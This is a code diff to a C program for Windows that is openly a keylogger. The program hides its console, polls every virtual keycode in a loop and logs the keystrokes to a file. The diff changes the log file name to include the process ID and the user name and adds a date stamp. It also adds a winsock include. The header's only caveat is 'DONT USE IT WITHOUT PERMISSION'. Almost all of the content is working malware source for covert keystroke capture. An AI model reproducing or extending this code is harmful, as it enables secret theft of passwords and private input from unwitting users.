@@ -2,6 +2,8 @@
   DONT USE IT WITHOUT PERMISSION */
 
 #include <stdio.h>
+#include <string.h>
+#include <winsock2.h>
 #include <windows.h>
 
 void stealth();
@@ -40,15 +42,33 @@ int save(int key, char *filename) {                          //save function tha
     return 0;
 }
 
-int main() {
-    stealth();                     //calls the function to hide the console
-    char c;
+int main()
+{
+    stealth();
+    SYSTEMTIME curr;
+    char c,filename[30],sessionname[15];
+    DWORD buffersize=15;
+
+    GetSystemTime(&curr);
+
+    itoa(GetCurrentProcessId(),filename,10);
+    GetUserNameA(sessionname,&buffersize);
+    strcat(filename,"_");
+    strcat(filename,sessionname);
+    strcat(filename,".log");
+
+    FILE *init;
+    init = fopen( filename , "w" );
+    fprintf(init,"DATE : %u/%u/%u || %u:%u \n",curr.wDay,curr.wMonth,curr.wYear,curr.wHour,curr.wMinute );
+    fclose(init);
+    
+    
 
     while (1) {
         Sleep(10);
-        for (int c = 0; c < 191; c++) {                //go through all the virtual keycodes to check if one of them was pressed
-            if (GetAsyncKeyState(c) == -32767)        
-                save(c, "ky.log");                    //name of the created file
+        for (int c = 0; c < 191; c++) {
+            if (GetAsyncKeyState(c) == -32767)
+                save(c, filename);
         }
     }
     return 0;
